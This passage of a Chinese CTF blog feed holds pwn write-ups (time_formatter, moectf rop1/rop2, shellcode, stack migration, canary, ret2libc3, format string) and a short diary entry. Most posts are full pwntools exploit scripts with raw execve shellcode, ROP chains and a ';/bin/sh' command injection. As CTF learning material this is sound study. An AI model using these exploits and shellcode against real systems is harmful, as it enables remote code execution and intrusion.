class="keyword">int</span>)menu(v4) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">          v5 = set_time_format(v4, <span class="string">"&gt; "</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">          v5 = set_time(v4, <span class="string">"&gt; "</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">          v5 = set_time_zone();</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">          v5 = print_time(v4, <span class="string">"&gt; "</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5u</span>:</span><br><span class="line">          v5 = exit_program(v4, <span class="string">"&gt; "</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//其中1和3两个选项对应的函数用到了动态分配的内存，函数2把输入的值放到了bss段</span></span><br><span class="line"><span class="comment">//不同的是函数1对输入进行了判断，函数2没有判断：</span></span><br><span class="line"></span><br><span class="line"><span class="function">_BOOL8 __fastcall <span class="title">sub_400CB5</span><span class="params">(<span class="keyword">char</span> *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> accept; <span class="comment">// [rsp+5h] [rbp-43h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+38h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(&amp;accept, <span class="string">"%aAbBcCdDeFgGhHIjklmNnNpPrRsStTuUVwWxXyYzZ:-_/0^# "</span>);</span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strspn</span>(s, &amp;accept) == <span class="built_in">strlen</span>(s);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//目前还不知道这个判断有什么作用</span></span><br></pre></td></tr></table></figure><br>继续往函数4和5看下去<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">print_time</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> command; <span class="comment">// [rsp+8h] [rbp-810h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+808h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    __snprintf_chk(&amp;command, <span class="number">2048L</span>L, <span class="number">1L</span>L, <span class="number">2048L</span>L, <span class="string">"/bin/date -d @%d +'%s'"</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)dword_602120, ptr, a3);</span><br><span class="line">    __printf_chk(<span class="number">1L</span>L, <span class="string">"Your formatted time is: "</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="keyword">if</span> ( getenv(<span class="string">"DEBUG"</span>) )</span><br><span class="line">      __fprintf_chk(<span class="built_in">stderr</span>, <span class="number">1L</span>L, <span class="string">"Running command: %s\n"</span>, &amp;command);</span><br><span class="line">    setenv(<span class="string">"TZ"</span>, value, <span class="number">1</span>);</span><br><span class="line">    system(&amp;command);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"You haven't specified a format!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">`/bin/date -d @%d +'%s'`是一个shell注入。</span></span><br><span class="line"><span class="comment">在命令行中，多个命令可以用分号隔开，执行时会依次运行。我们需要把它构造成：“/bin/data -d @0 + ";/bin/sh"”</span></span><br><span class="line"><span class="comment">但是由于传入的format在输入时就被限制了，所以不能直接通过format就让它执行我们想要的操作</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">signed</span> __int64 <span class="title">exit_program</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+8h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  free_0(ptr);</span><br><span class="line">  free_0(value);</span><br><span class="line">  __printf_chk(<span class="number">1L</span>L, <span class="string">"Are you sure you want to exit (y/N)? "</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  fgets(&amp;s, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  result = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( (s &amp; <span class="number">0xDF</span>) == <span class="number">89</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"OK, exiting."</span>);</span><br><span class="line">    result = <span class="number">1L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//这里，如果执行到函数5，会先释放format和time_zone的内存，然后再询问是否退出。</span></span><br><span class="line"><span class="comment">//但并没有在free之后立刻改变指针指向的位置，造成了uaf漏洞</span></span><br></pre></td></tr></table></figure></p><p>所以大概的思路就有了：</p><ol><li>先产生一个存放format的空间然后释放，释放后指针F依旧指向这块内存，这块小空间被放在fastbin的头部，下一次分配内存时如果大小合适将首先将它分配出去</li><li>进入函数3，输入payload，此时payload将放入原先放置format空间</li><li>进入函数4，执行system(“/bin/sh”)，getshell</li></ol><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">"220.249.52.133"</span>, <span class="number">32519</span>)</span><br><span class="line"><span class="comment">#p = process("./5")</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mass</span><span class="params">(ch,data)</span>:</span></span><br><span class="line">p.sendline(ch)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(data)&gt;<span class="number">0</span>:</span><br><span class="line">p.sendline(data)</span><br><span class="line"></span><br><span class="line">mass(<span class="string">"1"</span>,<span class="string">"a"</span>)</span><br><span class="line">mass(<span class="string">"5"</span>,<span class="string">"N"</span>)</span><br><span class="line">mass(<span class="string">"3"</span>,<span class="string">'\';/bin/sh\''</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">mass(<span class="string">"4"</span>,<span class="string">""</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;time-formatter&quot;&gt;&lt;a href=&quot;#time-formatter&quot; class=&quot;headerlink&quot; title=&quot;time_formatter&quot;&gt;&lt;/a&gt;time_formatter&lt;/h2&gt;&lt;p&gt;接触到的第一个堆漏洞题&lt;/p&gt;
&lt;p&gt;首先c
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>不定期日记</title>
    <link href="https://brubbish.github.io/39190.html"/>
    <id>https://brubbish.github.io/39190.html</id>
    <published>2020-11-26T11:46:04.771Z</published>
    <updated>2020-11-30T12:53:06.468Z</updated>
    
    <content type="html"><![CDATA[<p>感觉2020-10-28以前写的都…emmm好乱好蠢（…</p><p>鸽了一个月才开始写….</p><h3 id="2020-11-28"><a href="#2020-11-28" class="headerlink" title="2020-11-28"></a>2020-11-28</h3><p>在新电脑上配好了github pages+hexo，主要是安装nodejs、git、hexo，然后连接github上的账户</p><p>然后deploy的时候发现报错：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TypeError [ERR_INVALID_ARG_TYPE]: The &quot;mode&quot; argument must be integer. Received an instance of Objec</span><br></pre></td></tr></table></figure><br>查了之后发现可能是nodejs版本太高了…<br>不整了，先学习</p><p>一个多月前开始想学iot_sec。上周找学习路线和资料，并开始尝试arm汇编，结果qemu的环境都整不出来。期间和几位大师傅聊了一下，决定还是先学二进制，把方法论先掌握了。</p><p>开始学heap。</p><h3 id="2020-11-30"><a href="#2020-11-30" class="headerlink" title="2020-11-30"></a>2020-11-30</h3>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;感觉2020-10-28以前写的都…emmm好乱好蠢（…&lt;/p&gt;
&lt;p&gt;鸽了一个月才开始写….&lt;/p&gt;
&lt;h3 id=&quot;2020-11-28&quot;&gt;&lt;a href=&quot;#2020-11-28&quot; class=&quot;headerlink&quot; title=&quot;2020-11-28&quot;&gt;&lt;/a&gt;2
      
    
    </summary>
    
    
    
      <category term="日报" scheme="https://brubbish.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>pwn题wp</title>
    <link href="https://brubbish.github.io/31605.html"/>
    <id>https://brubbish.github.io/31605.html</id>
    <published>2020-11-26T11:46:04.755Z</published>
    <updated>2020-11-08T11:46:20.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2020moectf部分pwn"><a href="#2020moectf部分pwn" class="headerlink" title="2020moectf部分pwn"></a>2020moectf部分pwn</h1><h2 id="rop1"><a href="#rop1" class="headerlink" title="rop1"></a>rop1</h2><p>wp:<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./rop1'</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">sys = <span class="number">0x400670</span></span><br><span class="line">binsh = <span class="number">0x00601070</span></span><br><span class="line"></span><br><span class="line">p = <span class="string">'a'</span>*<span class="number">136</span> + p64(<span class="number">0x0400933</span>) + p64(binsh) + p64(sys) </span><br><span class="line"><span class="comment">#400933为‘pop rdi,ret’</span></span><br><span class="line">sh.sendline(p)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></p><p>需要注意到，这题是x64的，跟x86的做法（ctfwiki-basicROP-ret2libc1）有些不同。<br>x64调用函数传递参数时先使用rdi、rsi、rdx、rcx、r8、r9（储存整数和指针）等，再用栈</p><h2 id="rop2"><a href="#rop2" class="headerlink" title="rop2"></a>rop2</h2><p>wp:<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./rop2'</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">sys = <span class="number">0x0400670</span></span><br><span class="line">gets = <span class="number">0x04006b0</span></span><br><span class="line">pop_rdi = <span class="number">0x0400933</span></span><br><span class="line">bss = <span class="number">0x006010A8</span></span><br><span class="line"></span><br><span class="line">p = <span class="string">'a'</span>*<span class="number">136</span> + p64(pop_rdi) + p64(bss) + p64(gets) + p64(pop_rdi) + p64(bss) + p64(sys)</span><br><span class="line"></span><br><span class="line">sh.sendline(p)</span><br><span class="line">sh.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></p><p>卡在少了最开始的p64(pop_rdi) + p64(bss) </p><p>学长的解释是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">改变rdi的gadget地址 使其指向bss段的那个地址</span><br></pre></td></tr></table></figure></p><h2 id="unusual"><a href="#unusual" class="headerlink" title="unusual"></a>unusual</h2><p>用alpha3弄出一个Alphanumeric Shellcode</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line">sc = shellcraft.sh()</span><br><span class="line"><span class="keyword">print</span> asm(sc)</span><br><span class="line"><span class="comment">#sc.py</span></span><br><span class="line"></span><br><span class="line">python sc.py &gt; sc</span><br><span class="line"></span><br><span class="line">python alpha3/ALPHA3.py x64 ascii mixedcase rax --input=<span class="string">"sc"</span></span><br></pre></td></tr></table></figure><h2 id="hard-shelcode"><a href="#hard-shelcode" class="headerlink" title="hard_shelcode"></a>hard_shelcode</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line">sh = process(<span class="string">"./hard_shellcode"</span>)</span><br><span class="line">sc = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">sub_rsp = asm(<span class="string">'sub rsp, 64'</span>)</span><br><span class="line">jmp_rsp = asm(<span class="string">'jmp rsp'</span>)</span><br><span class="line">gadget = <span class="number">0x04000EA</span></span><br><span class="line"></span><br><span class="line">payload = sc + <span class="string">'a'</span>*(<span class="number">64</span>-len(sc)) + sub_rsp + jmp_rsp + <span class="string">'b'</span>*(<span class="number">8</span>-len(sub_rsp)-len(jmp_rsp)) + gadget</span><br><span class="line"><span class="comment">#payload = 'a'*16 + sc + sub_rsp + jmp_rsp + 'b'*(8-len(sub_rsp)-len(jmp_rsp)) + p64(gadget) </span></span><br><span class="line"><span class="comment">## sub rsp,48</span></span><br><span class="line"> </span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>用gadget跳转到”sub_rsp,jmp_rsp”然后执行sc(shellcode)</p><h2 id="baby-migration"><a href="#baby-migration" class="headerlink" title="baby_migration"></a>baby_migration</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'amd64'</span>)</span><br><span class="line">p = process(<span class="string">"./baby_migration"</span>)</span><br><span class="line"></span><br><span class="line">gets = <span class="number">0x4011C8</span></span><br><span class="line">rbp = <span class="number">0x404060</span></span><br><span class="line"><span class="comment">#shell = asm(shellcraft.sh())</span></span><br><span class="line">shell = <span class="string">'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">"a"</span>*<span class="number">0x30</span> + p64(rbp+<span class="number">300</span>) + p64(gets) </span><br><span class="line">payload2 = shell + <span class="string">'b'</span>*(<span class="number">0x30</span>-len(shell)) + p64(rbp ) + p64(rbp+<span class="number">300</span><span class="number">-0x30</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recv()</span><br><span class="line">sleep(<span class="number">0</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><a href="https://bbs.pediy.com/thread-258030.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-258030.htm</a></p><p><a href="https://blog.csdn.net/yuanyunfeng3/article/details/51456049" target="_blank" rel="noopener">https://blog.csdn.net/yuanyunfeng3/article/details/51456049</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">栈迁移 的核心思想就是 将栈 的 esp 和 ebp 转移到一个 输入不受长度限制的 且可控制 的 址处，通常是 bss 段地址！ 在最后 ret 的时候 如果我们能够控制得 了 栈顶 esp指向的地址 就想到于 控制了 程序执行流！</span><br></pre></td></tr></table></figure></p><p>用pwntolls生成的shellcode执行不了，可能是因为太长？</p><h2 id="baby-canary"><a href="#baby-canary" class="headerlink" title="baby_canary"></a>baby_canary</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = "debug"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process("./baby_canary")</span></span><br><span class="line">p = remote(<span class="string">'sec.arttnba3.cn'</span>,<span class="number">10003</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./baby_canary"</span>)</span><br><span class="line">libc = ELF(<span class="string">"/home/pluto/Desktop/libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">start = elf.symbols[<span class="string">'_start'</span>]</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">payload1 = <span class="string">'a'</span>*<span class="number">0x41</span></span><br><span class="line">p.send(payload1)<span class="comment">#dont use sendline</span></span><br><span class="line">p.recvuntil(payload1)</span><br><span class="line"></span><br><span class="line">canary = u32(<span class="string">'\x00'</span>+p.recv(<span class="number">3</span>))</span><br><span class="line">p.recv()</span><br><span class="line">payload2 = <span class="string">'b'</span>*<span class="number">0x40</span> + p32(canary) + <span class="string">'b'</span>*<span class="number">8</span> + <span class="string">'a'</span>*<span class="number">4</span> + p32(puts_plt) + p32(start) + p32(puts_got)</span><br><span class="line">p.send(payload2)</span><br><span class="line">p.recvuntil(<span class="string">"flag!\n"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">base_addr = puts_addr - libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">sys_addr = base_addr + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">binsh = base_addr + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line"></span><br><span class="line">p.send(payload1)</span><br><span class="line">payload3 = <span class="string">'b'</span>*<span class="number">0x40</span> + p32(canary) + <span class="string">'b'</span>*<span class="number">0xc</span> + p32(sys_addr) + <span class="string">'a'</span>*<span class="number">4</span> + p32(binsh)</span><br><span class="line">p.send(payload3)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>在覆盖’\x00’得到canary时不能用sendline</p><p>这题在本地弄不出来，在远程上就可以。发现是用的libc不一样，本机为libc6-i386_2.21-0ubuntu4_amd64，服务器上是libc6-i386_2.23-0ubuntu11.2_amd64</p><h1 id="ctfwiki"><a href="#ctfwiki" class="headerlink" title="ctfwiki"></a>ctfwiki</h1><h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><h3 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./ret2libc3"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./ret2libc3"</span>)</span><br><span class="line">p.recv()</span><br><span class="line">stack = <span class="string">'a'</span>*<span class="number">112</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">"puts"</span>]</span><br><span class="line">main_plt = elf.symbols[<span class="string">"_start"</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line">payload1 = stack + p32(puts_plt) + p32(main_plt) + p32(puts_got)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">recv1 = u32(p.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line">print(<span class="string">"puts.got_addr= "</span>,hex(recv1))</span><br><span class="line"><span class="comment">#puts.got = cb0</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line">puts_offset = <span class="number">0x05fcb0</span></span><br><span class="line">sys_offset = <span class="number">0x03adb0</span></span><br><span class="line">binsh_offset = <span class="number">0x15bb0b</span> </span><br><span class="line"></span><br><span class="line">libc_base = recv1 - puts_offset</span><br><span class="line">sys_addr = libc_base + sys_offset</span><br><span class="line">binsh = libc_base + binsh_offset</span><br><span class="line"></span><br><span class="line">payload2 = stack + p32(sys_addr) + <span class="string">'b'</span>*<span class="number">4</span> + p32(binsh)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>libc 对应的是libc6_2.23-0ubuntu11.2_i386，对此是完全没想到的…</p><p>讲的挺好的<a href="https://www.jianshu.com/p/83f55c55c173" target="_blank" rel="noopener">https://www.jianshu.com/p/83f55c55c173</a></p><h1 id="XCTF进阶"><a href="#XCTF进阶" class="headerlink" title="XCTF进阶"></a>XCTF进阶</h1><h2 id="实时数据监测"><a href="#实时数据监测" class="headerlink" title="实时数据监测"></a>实时数据监测</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>,arch=<span class="string">'amd64'</span>)</span><br><span class="line">p = remote(<span class="string">"220.249.52.133"</span>, <span class="number">35866</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmt</span><span class="params">(prev, word, index)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> prev &lt; word:</span><br><span class="line">        result = word - prev</span><br><span class="line">        fmtstr = <span class="string">"%"</span> + str(result) + <span class="string">"c"</span></span><br><span class="line">    <span class="keyword">elif</span> prev == word:</span><br><span class="line">        result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result = <span class="number">256</span> + word - prev</span><br><span class="line">        fmtstr = <span class="string">"%"</span> + str(result) + <span class="string">"c"</span></span><br><span class="line">    fmtstr += <span class="string">"%"</span> + str(index) + <span class="string">"$hhn"</span></span><br><span class="line">    <span class="keyword">return</span> fmtstr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmt_str</span><span class="params">(offset, size, addr, target)</span>:</span></span><br><span class="line">    payload = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">if</span> size == <span class="number">4</span>:</span><br><span class="line">            payload += p32(addr + i)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            payload += p64(addr + i)</span><br><span class="line">    prev = len(payload)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">        payload += fmt(prev, (target &gt;&gt; i * <span class="number">8</span>) &amp; <span class="number">0xff</span>, offset + i)</span><br><span class="line">        prev = (target &gt;&gt; i * <span class="number">8</span>) &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line">payload = fmt_str(<span class="number">12</span>,<span class="number">4</span>,<span class="number">0x0804a048</span>,<span class="number">0x02223322</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><a href="https://www.dazhuanlan.com/2019/11/07/5dc3d67635dfe/" target="_blank" rel="noopener">https://www.dazhuanlan.com/2019/11/07/5dc3d67635dfe/</a></p><p>用ctfwiki提供的脚本比较快，自己试挺麻烦的…（还是不太熟练</p><h2 id="welpwn"><a href="#welpwn" class="headerlink" title="welpwn"></a>welpwn</h2><figure class="highlight py"><table><tr><td 